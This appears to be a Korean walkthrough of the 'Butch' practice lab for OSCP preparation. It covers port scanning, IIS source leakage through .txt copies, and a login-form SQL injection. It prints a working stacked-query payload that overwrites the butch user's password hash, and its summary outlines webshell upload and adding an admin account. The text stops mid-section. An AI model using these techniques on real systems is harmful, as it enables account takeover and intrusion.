---
tags:
  - type/machine
  - platform/pg
  - os/windows
  - status/solved
  - tech/web/sqli
  - tech/web/file-upload
  - tech/db/mssql
  - tech/exec/winrm
  - tech/payload/revshell
type: machine
platform: pg
os: windows
ip: 192.168.243.63
ports: [21, 25, 135, 139, 445, 450, 5985]
services: [ftp, http, microsoft-ds, msrpc, netbios-ssn, smtp]
status: solved
manual_tags: true
tech_count: 5
---

> [!info] PG Practice — Butch
> **타겟** 192.168.243.63 · **OS** Windows Server 2019 (`butch`, IIS 10.0 / ASP.NET 4.0.30319) · **플래그 2개**
> 경로 요약 — 450번 포트의 IIS 웹앱 → `/dev/` 디렉터리 리스팅으로 소스 노출(`.txt` 사본) → 로그인 폼 스택 쿼리 SQLi 로 비밀번호 해시 덮어쓰기 → `butch` 로 로그인 → `.ashx` 웹셸 업로드 → 앱풀이 특권 신원이라 곧바로 `net user /add` → 로컬 관리자 계정 생성 → evil-winrm → 토큰 필터링 우회 후 `proof.txt`

## 0. 이 박스에서 배우는 것

- 웹은 80/443 에만 있지 않다. 이 박스의 웹은 **450번**이고, 전 포트 스캔을 안 하면 시작조차 못 한다
- 소스 코드 노출의 전형. `.cs`/`.master` 는 IIS 가 거부하지만, 개발자가 `.txt` 로 복사해 두면 IIS 는 그것을 정적 파일로 취급해 원문 그대로 뱉는다. 이 박스에서는 **`.txt` 사본이 유일한 소스 유출 경로**였다
- SQL 인젝션은 읽기만이 아니다. 데이터를 빼내는 대신 `UPDATE` 로 비밀번호 해시를 덮어써서 로그인하는 쓰기형 공격
- MSSQL/ADO.NET 에서 스택 쿼리(`; ...; --`)가 통하는 이유. MySQL+JDBC 와 갈리는 지점이다
- `.ashx` 웹셸 — 업로드 필터 블랙리스트에서 자주 누락되는 확장자. (이 박스에 필터가 실제로 있었는지는 기록에 없다. 2-6 참조)
- Windows 로컬 계정과 WinRM 의 토큰 필터링. 관리자 그룹에 넣었는데 `whoami /priv` 가 초라한 이유

시험 출제 가능성은 높게 본다. 네 조각이 전부 OSCP 단골이기 때문이다 — 비표준 포트의 웹앱, 디렉터리 리스팅으로 새는 소스, 로그인 폼 SQLi, 업로드에서 웹셸을 거쳐 Windows 계정 생성과 WinRM 으로 가는 마무리.

특히 sqlmap 이 금지된 조건 아래에서는, 따옴표 하나 넣어보고 에러를 읽어 수동 페이로드를 조립하는 이 박스의 흐름이 그대로 시험 자산이 된다. 변형으로는 해시를 덮어쓰는 대신 에러 메시지로 테이블·컬럼명을 뽑아 UNION 으로 해시를 추출하게 만드는 형태, 또는 업로드 블랙리스트를 `.asp;.aspx` 까지 막아 `.ashx`/`.asmx` 로 유도하는 형태를 예상한다.

---

## 1. 정찰

### Nmap

```bash
┌──(kali㉿kali)-[~/PG/Butch]
└─$ nnmap 192.168.243.63
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-18 10:48 +0900
Nmap scan report for 192.168.243.63
Host is up (0.086s latency).
Not shown: 65528 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
25/tcp   open  smtp          Microsoft ESMTP 10.0.17763.1
| smtp-commands: butch Hello [192.168.45.207], TURN, SIZE 2097152, ETRN, PIPELINING, DSN, ENHANCEDSTATUSCODES, 8bitmime, BINARYMIME, CHUNKING, VRFY, OK
|_ This server supports the following commands: HELO EHLO STARTTLS RCPT DATA RSET MAIL QUIT HELP AUTH TURN ETRN BDAT VRFY
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
450/tcp  open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Butch
| http-methods:
|_  Potentially risky methods: TRACE
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (92%), Microsoft Windows 10 1903 - 21H1 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: butch; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-08-18T01:50:03
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required

TRACEROUTE (using port 135/tcp)
HOP RTT      ADDRESS
1   85.78 ms 192.168.45.1
2   85.63 ms 192.168.45.254
3   86.38 ms 192.168.251.1
4   87.36 ms 192.168.243.63

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.69 seconds
```

> [!danger] 웹이 80 이 아니라 450 에 있다
> `450/tcp open http Microsoft IIS httpd 10.0`. **기본 1000포트 스캔(`nmap <ip>`)에는 450 이 들어 있지 않다.** 전 포트를 안 돌리면 FTP·SMTP·SMB 만 보이고, 그러면 SMB 릴레이나 SMTP 사용자 열거로 시간을 태우게 된다.
> `Not shown: 65528 filtered tcp ports` 가 65535개를 전부 봤다는 증거다. 이 줄이 없으면 전수 스캔이 아니다.
> 같은 패턴: [[Hawat]](웹이 17445·30455·50080에만 존재).

출력을 한 줄씩 읽으면 이렇게 갈라진다.

| 줄 | 읽는 법 |
|---|---|
| `Not shown: 65528 filtered` | 응답 자체가 없다 = 호스트 방화벽이 기본 차단. 열린 7개가 전부다 |
| `21/tcp Microsoft ftpd` + `SYST: Windows_NT` | IIS FTP. 익명 로그인과 웹루트 겹침을 가장 먼저 확인할 후보 |
| `25/tcp Microsoft ESMTP 10.0.17763.1` | 빌드 번호가 그대로 노출됐다. 17763 = Windows Server 2019(1809). OS 판정의 독립 근거 1 |
| `VRFY` 지원 | SMTP 사용자 열거가 가능한 신호. 이 박스에서는 쓰지 않았다(6장) |
| `Running (JUST GUESSING): Windows 2019 (92%)` | OS 판정 독립 근거 2. 근거 1과 일치하므로 Server 2019 확정 |
| `450/tcp http IIS 10.0` + `http-title: Butch` | 주 공격면. IIS 10.0 은 Server 2016/2019 의 기본 |
| `5985/tcp Microsoft HTTPAPI httpd 2.0` | **WinRM 이 열려 있다.** 자격증명만 얻으면 셸이 있다는 뜻이라 최종 목표가 미리 정해진다 |
| `smb2-security-mode: signing enabled but not required` | SMB 릴레이 가능 조건. 다만 릴레이 대상이 필요하고 단일 호스트라 실익이 적다 |

`Potentially risky methods: TRACE` 는 nmap 이 늘 붙이는 저위험 지적이다. Cross-Site Tracing 은 최신 브라우저에서 `XMLHttpRequest` 가 TRACE 를 막아 사실상 죽은 공격이라, 이 줄을 보고 시험에서 시간을 쓸 이유가 없다. 리포트의 Low 항목으로 한 줄 적고 넘어간다.

`nnmap` 은 오타가 아니다. `nmap.log` 첫 줄에 실제 명령이 그대로 남아 있다.

```
# Nmap 7.98 scan initiated Tue Aug 18 10:48:59 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.243.63
```

Kali `~/.zshrc:247` 에서 정의를 직접 확인했다.

```sh
alias nnmap='nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log'
```

[[Squid]] 박스에서도 같은 플래그셋이 쓰인 것이 이 별칭 때문이다. 다만 별칭에 `-oN nmap.log` 가 박혀 있으니, 작업 디렉터리를 안 바꾸고 다음 박스를 스캔하면 이전 박스의 로그를 덮어쓴다. 재현할 때는 아래를 쓴다(위 명령과 동일하다).

```bash
sudo nmap -sCV -A -p- -Pn --min-rate 5000 -oN nmap.log 192.168.243.63
```

| 플래그 | 역할 | 빼면 |
|---|---|---|
| `-p-` | 1–65535 전수 | **450 을 못 찾는다. 박스가 통째로 막힌다** |
| `-sCV` | 기본 NSE + 버전 | `Microsoft ESMTP 10.0.17763.1` 같은 빌드 번호를 못 얻는다 |
| `-Pn` | ping 생략 | 윈도 방화벽이 ICMP 를 막으면 호스트가 down 으로 판정되어 스캔 자체가 안 돈다 |
| `--min-rate 5000` | 초당 패킷 하한 | 전수 스캔이 수십 분으로 늘어난다 |
| `-oN` | 결과 저장 | 나중에 되짚을 근거가 사라진다 (시험 리포트 증적) |

### whatweb — 웹 스택 판정

```bash
┌──(kali㉿kali)-[~/PG/Butch]
└─$ cat whatweb.txt
http://192.168.243.63:450 [200 OK] ASP_NET[4.0.30319], Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[192.168.243.63], Meta-Author[Butch], Microsoft-IIS[10.0], PasswordField[ctl00$ContentPlaceHolder1$PasswordTextBox], Title[Butch][Title element contains newline(s)!], X-Powered-By[ASP.NET]
```

이 한 줄에서 세 가지가 확정된다.

| 단서 | 의미 |
|---|---|
| `ASP_NET[4.0.30319]` | .NET Framework 4.x CLR 버전. .NET Core 가 아니라 클래식 ASP.NET 이므로 `web.config`·`.aspx`·`.ashx` 세계다 |
| `PasswordField[ctl00$ContentPlaceHolder1$PasswordTextBox]` | ASP.NET WebForms 확정. 필드명이 `ctl00$...$...` 로 시작하는 것은 마스터 페이지 + ContentPlaceHolder 구조의 서명이다 |
| `Meta-Author[Butch]` | 커스텀 개발 앱. 알려진 CVE 가 아니라 코드 결함을 찾아야 한다 |

`ctl00$ContentPlaceHolder1$PasswordTextBox` 는 읽는 법을 알아두면 시험에서 바로 쓴다. ASP.NET WebForms 는 서버 컨트롤의 이름을 컨테이너 계층으로 접두하는데, `ctl00` 이 마스터 페이지 자체(자동 생성 ID), `ContentPlaceHolder1` 이 마스터 안의 콘텐츠 영역 ID, `PasswordTextBox` 가 실제 컨트롤 ID 다.

`curl` 로 로그인을 자동화할 때는 파라미터 이름을 정확히 이 문자열로 보내야 한다. **`password=...` 로 보내면 서버는 그냥 무시하고 빈 값으로 처리한다.** 그리고 WebForms 폼에는 거의 항상 `__VIEWSTATE`·`__EVENTVALIDATION`·`__VIEWSTATEGENERATOR` 히든 필드가 붙는다. 이걸 매 요청마다 파싱해 되돌려주지 않으면 `Validation of viewstate MAC failed` 에러가 난다.

```bash
# WebForms 폼 자동화 골격 (시험용 반사)
curl -s -c c.jar http://TARGET:450/ -o page.html
VS=$(grep -oP '__VIEWSTATE" value="\K[^"]+' page.html)
EV=$(grep -oP '__EVENTVALIDATION" value="\K[^"]+' page.html)
curl -s -b c.jar -c c.jar http://TARGET:450/ \
  --data-urlencode "__VIEWSTATE=$VS" \
  --data-urlencode "__EVENTVALIDATION=$EV" \
  --data-urlencode 'ctl00$ContentPlaceHolder1$PasswordTextBox=x'
```

VIEWSTATE 파싱이 귀찮으면 브라우저에서 손으로 하는 편이 빠르고, 이 박스도 실제로 브라우저로 풀었다(스크린샷 참조). 시험에서 시간을 재는 기준은 단순하다 — 자동화에 5분 이상 들어가면 손으로 넘어간다.

### feroxbuster — 디렉터리 열거

```bash
┌──(kali㉿kali)-[~/PG/Butch]
└─$ feroxbuster -u http://192.168.243.63:450/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x asp,txt,html,bak,zip -t 100

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.243.63:450/
 🚩  In-Scope Url          │ 192.168.243.63
 🚀  Threads               │ 100
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [asp, txt, html, bak, zip]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       10l       60w     4209c http://192.168.243.63:450/favicon.png
200      GET       82l      138w     1191c http://192.168.243.63:450/style.css
200      GET       42l      128w     2128c http://192.168.243.63:450/
301      GET        2l       10w      153c http://192.168.243.63:450/dev => http://192.168.243.63:450/dev/
301      GET        2l       10w      153c http://192.168.243.63:450/DEV => http://192.168.243.63:450/DEV/
301      GET        2l       10w      153c http://192.168.243.63:450/Dev => http://192.168.243.63:450/Dev/
404      GET       40l      156w     1888c http://192.168.243.63:450/con
404      GET       40l      156w     1888c http://192.168.243.63:450/aux
400      GET        6l       26w      324c http://192.168.243.63:450/error%1F_log
400      GET        6l       26w      324c http://192.168.243.63:450/error%1F_log.asp
400      GET        6l       26w      324c http://192.168.243.63:450/error%1F_log.txt
400      GET        6l       26w      324c http://192.168.243.63:450/error%1F_log.html
400      GET        6l       26w      324c http://192.168.243.63:450/error%1F_log.bak
400      GET        6l       26w      324c http://192.168.243.63:450/error%1F_log.zip
404      GET       40l      156w     1888c http://192.168.243.63:450/prn
[####################] - 3m    180156/180156  0s      found:15      errors:0
[####################] - 3m    180000/180000  1100/s  http://192.168.243.63:450/
[####################] - 0s    180000/180000  1034483/s http://192.168.243.63:450/dev/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s    180000/180000  1034483/s http://192.168.243.63:450/DEV/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s    180000/180000  1052632/s http://192.168.243.63:450/Dev/ => Directory listing (add --scan-dir-listings to scan)     
```

이 플래그 조합을 고른 이유는 이렇다.

| 플래그 | 역할 | 빼면 |
|---|---|---|
| `-x asp,txt,html,bak,zip` | 확장자를 붙여 재시도 | **`.txt` 를 안 붙였으면 `site.master.txt` 계열 소스 노출을 놓친다.** IIS 타겟이면 `asp,aspx,ashx,asmx,config,txt,bak,zip,old` 는 필수다 |
| `-t 100` | 동시 100 스레드 | 기본값이면 18만 요청이 수 배로 느려진다. 반대로 너무 올리면 앱이 뻗어 오탐 404 가 쏟아진다 |
| (기본) `Extract Links: true` | 응답 본문의 링크를 자동 추가 | 워드리스트에 없는 경로를 놓친다 |
| (기본) `Recursion Depth 4` | 발견한 디렉터리를 재귀 탐색 | 하위 경로를 못 본다 |

빠진 것은 **`--scan-dir-listings`** 다. 출력이 친절하게 알려준다 — `Directory listing (add --scan-dir-listings to scan)`. 이걸 켰다면 `/dev/` 안의 파일 목록을 feroxbuster 가 직접 긁어왔다. 이 박스는 브라우저로 열어서 해결했지만, 알림 줄을 읽고 재실행하는 습관을 들이는 편이 낫다.

이 출력에는 스캐너 함정이 셋 들어 있다.

`/dev`·`/DEV`·`/Dev` 가 셋 다 301 인 것은 세 개의 발견이 아니라 하나의 디렉터리다. Windows/IIS 의 파일시스템은 대소문자를 구분하지 않는다. 리눅스 감각으로 "숨겨진 변형 경로가 셋이나 있다"고 읽으면 시간을 버린다. 반대로 이 성질은 이득으로도 쓸 수 있어서, 업로드 필터가 `.aspx` 만 소문자로 블랙리스트했다면 `.AspX` 가 통과한 뒤 정상 실행된다.

`/con`·`/aux`·`/prn` 이 404(본문 1888c)로 찍히는 것은 DOS 예약 장치명이기 때문이다. `CON`·`PRN`·`AUX`·`NUL`·`COM1~9`·`LPT1~9` 는 Windows 에서 파일명이 될 수 없어 IIS 가 특수 처리한다. 실재하는 경로가 아니다.

`error%1F_log` 계열이 전부 400 인 것도 발견이 아니다. `%1F` 는 제어문자(Unit Separator)이고, IIS 의 `http.sys` 가 URL 의 제어문자를 애플리케이션에 닿기 전에 거절한다. 워드리스트 오염이다. 판별 기준은 간단하다 — **400 은 "서버가 요청 형식을 거부"이지 "리소스가 있다"가 아니다.** 추격할 것은 `200`·`301/302`·`403` 뿐이고, 그중 `403` 이 특히 값지다. 있는데 못 본다는 뜻이기 때문이다.

---

## 2. 취약점 분석

이 박스의 취약점은 하나가 아니라 넷이 사슬로 엮여 있다.

| # | 취약점 | 얻는 것 |
|---|---|---|
| ① | `/dev/` 디렉터리 리스팅 + 소스 노출 | 앱 내부 구조 · 해시 방식 |
| ② | 로그인 폼 스택 쿼리 SQL 인젝션 | 인증 우회 (butch 계정 탈취) |
| ③ | 인증 후 실행 가능한 확장자 파일 업로드 + 업로드 경로가 실행 가능 | RCE |
| ④ | IIS 앱풀이 특권 신원으로 구동 | 곧바로 로컬 관리자 |

하나라도 끊기면 체인이 죽는다. 역으로, 하나가 막혔을 때 어디를 다시 봐야 하는지도 이 표가 알려준다.

### 2-1. 배경 지식 ① — 디렉터리 리스팅에서 소스 유출까지

`/dev/`

![[Pasted image 20260818110442.png]]

IIS 에서 디렉터리 리스팅(Directory Browsing)은 **기본 비활성**이다. 켜져 있다는 것은 개발자가 의도적으로 켰다는 뜻이고, 그런 디렉터리에는 대개 배포되면 안 되는 것이 들어 있다.

ASP.NET 의 확장자는 셋 중 하나로 처리된다. 이 구분이 이 박스 체인의 출발점이다.

| 확장자 | IIS/ASP.NET 처리 | 브라우저로 원문이 보이는가 |
|---|---|---|
| `.aspx` · `.ashx` · `.asmx` | 핸들러가 가로채 컴파일·실행 (`PageHandlerFactory` / `SimpleHandlerFactory`) | 아니다 — 렌더링 결과만 |
| `.master` · `.cs` · `.config` · `.asax` | **거부된다** (`HttpForbiddenHandler`) | 아니다 — 에러만 |
| `.txt` · `.bak` · `.old` · `~` | 매핑 없음 → 정적 파일로 서빙 | **그렇다. 원문 그대로** |

근거는 프레임워크 기본 설정 파일이다 — `%windir%\Microsoft.NET\Framework64\v4.0.30319\Config\web.config`.

```xml
<add path="*.aspx"   type="System.Web.UI.PageHandlerFactory" />
<add path="*.ashx"   type="System.Web.UI.SimpleHandlerFactory" />
<add path="*.master" type="System.Web.HttpForbiddenHandler" />
<add path="*.cs"     type="System.Web.HttpForbiddenHandler" />
```

게다가 IIS7+ 기본 `applicationHost.config` 의 요청 필터링이 한 겹 더 있다.

```xml
<requestFiltering>
  <fileExtensions>
    <add fileExtension=".master" allowed="false" />
    <add fileExtension=".cs"     allowed="false" />
```

그래서 실제 응답은 HTTP `404.7 — File extension denied` 다. 요청 필터링을 제거한 경우에만 그 아래 ASP.NET 층의 `403 — This type of page is not served` 에 도달한다.

`.txt` 사본이 유일한 소스 유출 경로였던 이유가 여기 있다. 개발자는 동료에게 코드를 보여주려고 `.txt` 로 복사하고, 그 순간 화이트박스 리뷰의 문이 열린다.

일반화하면 — IIS/ASP.NET 타겟을 만나면 실행·거부 확장자 뒤에 정적 확장자를 덧붙여 전수로 찔러본다.

```
default.aspx.txt   default.aspx.bak   default.aspx.old   default.aspx~
web.config.txt     web.config.bak     global.asax.txt
site.master.cs.txt site.master.txt    login.aspx.cs.bak
*.zip  *.rar  *.7z
```

**`login.aspx.cs` 자체를 요청하는 것은 의미가 없다.** 위 표대로 `.cs` 는 거부되기 때문에(404.7) 덧붙이는 정적 확장자가 핵심이다. 확장자 사본이 없다면 남은 경로는 다운로드·뷰어 엔드포인트(`download.aspx?file=`)나 경로 순회뿐이다. 같은 계열로 PHP 의 `index.php.bak`, Java 의 `WEB-INF/web.xml`, Node 의 `.env`, 그리고 [[Hawat]] 의 노출된 소스 zip 이 있다.

`site.master.txt`

```html
<%@ Language="C#" src="site.master.cs" Inherits="MyNamespaceMaster.MyClassMaster" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en">
	<head runat="server">
		<title>Butch</title>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
		<meta name="application-name" content="Butch">
		<meta name="author" content="Butch">
		<meta name="description" content="Butch">
		<meta name="keywords" content="Butch">
		<link media="all" href="style.css" rel="stylesheet" type="text/css" />
		<link id="favicon" rel="shortcut icon" type="image/png" href="favicon.png" />
	</head>
	<body>
		<div id="wrap">
			<div id="header">Welcome to Butch Repository</div>
			<div id="main">
				<div id="content">
					<br />
					<asp:contentplaceholder id="ContentPlaceHolder1" runat="server"></asp:contentplaceholder>
					<br />
				</div>
			</div>
		</div>
	</body>
</html>
```

첫 줄이 전부다:

```
<%@ Language="C#" src="site.master.cs" Inherits="MyNamespaceMaster.MyClassMaster" %>
```

| 조각 | 알려주는 것 |
|---|---|
| `Language="C#"` | 코드비하인드가 C#. VB.NET 이 아니다 |
| `src="site.master.cs"` | `.cs` 원본이 웹루트에 함께 놓여 있다. 단 `/dev/site.master.cs` 를 직접 요청하면 반드시 실패한다(404.7 — `.cs` 는 거부 확장자). 노려야 할 것은 핸들러 파이프라인을 우회하는 사본 — `site.master.cs.txt` · `.bak` · `.old` · `site.master.cs~` |
| `Inherits="MyNamespaceMaster.MyClassMaster"` | 네임스페이스/클래스명. 다른 페이지의 코드비하인드 이름을 추측하는 재료 |
| `<asp:contentplaceholder id="ContentPlaceHolder1">` | whatweb 이 본 `ctl00$ContentPlaceHolder1$PasswordTextBox` 의 출처가 확인됐다. 독립 근거 2개가 맞물린다 |

`src=` 속성은 컴파일 시점 컴파일을 뜻한다. 일반 WebForms 는 `CodeBehind="x.aspx.cs"` 와 미리 컴파일된 DLL(`/bin/`)을 쓰는데, 여기처럼 `src=` 를 쓰면 `.cs` 파일이 웹루트에 실제로 존재하고 런타임에 컴파일된다.

즉 `.cs` 원문이 서버 어딘가에 반드시 있다. 하지만 HTTP 로 그 파일을 직접 받을 수는 없다. `.cs` 는 요청 필터링과 `HttpForbiddenHandler` 에 이중으로 막힌다. 그래서 다음 수순은 `.cs` 요청이 아니라 `/dev/` 리스팅을 눈으로 훑어 `.txt`·`.bak` 사본을 찾는 것이 된다. 디렉터리 리스팅이 켜져 있다는 사실이 여기서 값을 한다 — 어떤 사본이 존재하는지 추측할 필요 없이 목록으로 보이기 때문이다.

### 2-2. 취약점 ② — 로그인 폼 SQL 인젝션

id 입력창에 작은따음표 입력 ' 시 에러 발생

![[Pasted image 20260818110543.png]]

따옴표 하나에 에러 페이지. **SQLi 의 고전적 1차 신호다.**

서버 코드가 이런 모양이면(전형적인 ADO.NET 안티패턴):

```csharp
string q = "SELECT password_hash FROM users WHERE username = '" + idTextBox.Text + "'";
SqlCommand cmd = new SqlCommand(q, conn);
```

입력이 `'` 이면 최종 쿼리는 이렇게 된다.

```sql
SELECT password_hash FROM users WHERE username = '''
```

따옴표가 홀수 개라 문자열이 닫히지 않고 T-SQL 파서가 `Unclosed quotation mark after the character string` 을 던진다. 그리고 에러가 화면에 보인다는 것은 `customErrors mode="Off"` 이거나 `RemoteOnly` 가 아니라는 뜻이다. 이건 두 번째 선물이다. 에러 기반 추출 채널이 살아 있다는 신호이기 때문이다.

SQLi 존재 확인은 세 번의 입력이면 끝난다.

| 입력 | 기대 | 판정 |
|---|---|---|
| `'` | 에러 | 문자열 컨텍스트 인젝션 성립 |
| `''` | 정상(로그인 실패) | 따옴표 개수가 맞으면 에러가 사라짐 → 에러가 우연이 아님을 확증 |
| `' or '1'='1` | 동작 변화 | 논리 조작이 서버에 도달함 |

**`'` 하나로 에러가 났다고 바로 페이로드를 던지지 마라.** `''` 로 에러가 사라지는지 확인하는 1초가 단순 500 에러 페이지를 오탐으로 걸러낸다.

여기서 에러 메시지를 읽어야 다음이 열린다. ASP.NET 의 노란 에러 페이지(Yellow Screen of Death)에는 일반적으로 다음이 그대로 찍힌다. 아래는 이 박스의 관측이 아니라 읽는 법의 일반론이다.

- 예외 타입 — `System.Data.SqlClient.SqlException` 이면 백엔드는 Microsoft SQL Server 다(MySQL 이면 `MySql.Data.MySqlClient.MySqlException`, Oracle 이면 `Oracle.ManagedDataAccess.Client.OracleException`)
- 에러 원문 — `Invalid column name 'xxx'` / `Incorrect syntax near ...`
- 스택 트레이스 — 코드비하인드 파일 경로와 줄 번호

백엔드 DBMS 판정이 페이로드 문법을 통째로 결정한다. 아래 2-3 이 그 이야기다.

> [!warning] **[가정]** 이 박스의 DBMS 판정은 관측이 아니라 연역이다
> 이 노트에는 에러 메시지 원문이 한 번도 실려 있지 않다(스크린샷 링크뿐이고, 원본 기록에도 DBMS 를 확정하는 출력이 없다). 그러므로 "`SqlException` 을 눈으로 봤다"고 적으면 그것은 사실이 아니다.
> 판정 근거는 스크린샷의 예외 타입으로 MSSQL 이라고 본 것이고, 이를 뒷받침하는 방증은 셋이다:
> 1. IIS 10 + ASP.NET 4.0 WebForms — 이 스택의 기본 데이터 접근은 `System.Data.SqlClient`(MSSQL)
> 2. 세미콜론 스택 쿼리가 실제로 성립했다 — 아래 2-3 표대로 MySQL+PHP/JDBC 였다면 실패했을 것이다
> 3. 후행 공백 없는 `--` 가 주석으로 동작했다 — MySQL 이라면 `-- `(공백 필수)여야 한다
>
> 셋이 전부 MSSQL 을 가리키므로 결론은 사실상 확정에 가깝다. 그러나 "확정"과 "강한 추론"을 표기로 구분하는 습관 자체가 시험 리포트에서는 자산이다. 채점자는 근거의 출처를 본다.

### 2-3. 왜 스택 쿼리(`; ... ; --`)가 통하는가 — 이 박스의 핵심 원리

실행한 페이로드:

```sql
'; update users set password_hash='48f9460fe0dc9f272e7414963dd2b52287ec07d872d665d2e9364c957f163ab0' where username = 'butch'; --
```

![[Pasted image 20260818111108.png]]

스택 쿼리(Stacked / Batched Query)는 세미콜론으로 구분된 여러 문장을 한 번에 보내는 것이다. 원 쿼리가 `SELECT` 인데 완전히 다른 `UPDATE` 를 이어 붙여 실행시킨다. 이것이 되면 SQLi 는 읽기 취약점이 아니라 **임의 쓰기 취약점**이 되고, MSSQL 이라면 `EXEC xp_cmdshell` 로 곧바로 RCE 까지 간다.

되고 안 되고는 DBMS 와 드라이버 조합이 결정한다. 이 표는 외워둘 값이 있다.

| 조합 | 스택 쿼리 | 근거 |
|---|---|---|
| MSSQL + ADO.NET(`SqlCommand`) | **된다** | T-SQL 은 배치 실행이 기본. 이 박스가 여기 해당 |
| MSSQL + JDBC / PHP `sqlsrv` | 된다 | 동일 |
| PostgreSQL + 대부분의 드라이버 | 된다 | |
| MySQL + JDBC | **안 된다** | `allowMultiQueries=false` 가 기본 ([[Hawat]] 에서 실제로 막혔다) |
| MySQL + PHP `mysqli_query()` | **안 된다** | 단일 문장만 실행. `mysqli_multi_query()` 여야 됨 |
| Oracle | **안 된다** | 익명 PL/SQL 블록을 써야 함 |

판단 순서는 에러 메시지로 DBMS 를 확정하고, 이 표로 스택 쿼리 가부를 결정하고, 되면 UPDATE/EXEC 로 안 되면 UNION/blind 로 가는 것이다. 이 판단을 먼저 하면 안 되는 기법에 시간을 태우지 않는다.

### 2-4. 왜 이 페이로드인가 — 조각내어 읽기

```sql
'; update users set password_hash='48f9...ab0' where username = 'butch'; --
```

| 조각 | 역할 | 빼면 |
|---|---|---|
| `'` | 원 쿼리의 문자열 리터럴을 조기 종료. 이 시점에서 커서는 SQL 문법 위에 선다 | 입력이 그냥 데이터로 남는다 |
| `;` | 문장 경계. 앞의 `SELECT ... WHERE username = ''` 를 끝내고 새 문장을 연다 | 이어붙은 `update` 가 `SELECT` 의 일부로 해석되어 구문 에러 |
| `update users set password_hash='...'` | 본체. 저장된 해시를 내가 아는 값으로 교체 | — |
| `where username = 'butch'` | 대상 한정 | 테이블 전체의 비밀번호가 날아간다. 앱의 다른 계정으로 돌아갈 길이 끊기고, 채점 재현과 본인의 재접근 가능성까지 함께 죽는다. 되돌릴 방법은 revert 뿐인데 revert 하면 그 머신의 진척이 전부 사라진다 |
| `; --` | 뒤에 남은 원 쿼리 잔여물(`'`)을 주석 처리 | 닫히지 않은 따옴표가 남아 구문 에러 |

**T-SQL 의 `--` 는 MySQL 과 다르다.** MySQL 은 `--` 다음에 공백이나 개행이 반드시 있어야 주석으로 보고(그래서 [[Hawat]] 에서는 `-- ` 로 썼다), T-SQL 은 `--` 만으로 줄 끝까지 주석이다. 대신 URL 인코딩 과정에서 후행 공백이 잘리는 사고가 흔하므로, 어느 DBMS 든 `-- -` 또는 `/*` 를 쓰는 습관이 안전하다. `%23`(`#`)은 MySQL 전용이라 MSSQL 에서는 통하지 않는다.

UNION 으로 읽지 않고 UPDATE 로 덮어쓴 것은 속도를 산 선택이다. 컬럼 수를 맞출 필요도 해시를 크랙할 필요도 없이 한 방에 끝난다. 대가는 셋이다.

1. 원본 해시가 영구 소실된다. 그 해시가 다른 서비스(FTP·SMB·WinRM)에서 재사용됐을 수 있는데, 확인할 기회를 스스로 없앤 것이다.
2. 되돌릴 수 없다. 랩은 Revert 하면 되지만 실무 침투테스트에서는 계약 위반이 될 수 있다.
3. 탐지된다. 정상 사용자가 로그인 못 하게 되므로 즉시 신고가 들어온다.

시험에서든 실무에서든 더 나은 순서는 에러 기반이나 UNION 으로 원본 해시를 먼저 뽑고, 크랙을 시도하고, 실패하면 그때 덮어쓰는 것이다. 원본 해시를 손에 쥐고 있으면 나중에 원상복구도 가능하다.

```sql
'; update users set password_hash='<원본해시>' where username='butch'; --
```

이 노트의 실행 기록은 세 번째 단계로 직행한 경우다. 속도는 최선, 절차는 차선이었다.

### 2-5. 그 해시값은 어디서 왔는가 — `48f9460f...` 의 정체

확정 사실 — `48f9460fe0dc9f272e7414963dd2b52287ec07d872d665d2e9364c957f163ab0` 은 `butch` 라는 문자열(소문자, 개행 없음)의 SHA-256 이다.

> [!note] 검산 절차 — 이 값이 무엇의 해시인지 확인하는 법
> 아래는 당시 세션 기록이 아니라 검산 절차다(원본 작업 로그에는 이 계산이 남아 있지 않다). 값은 재계산으로 일치를 확인했다.
> ```bash
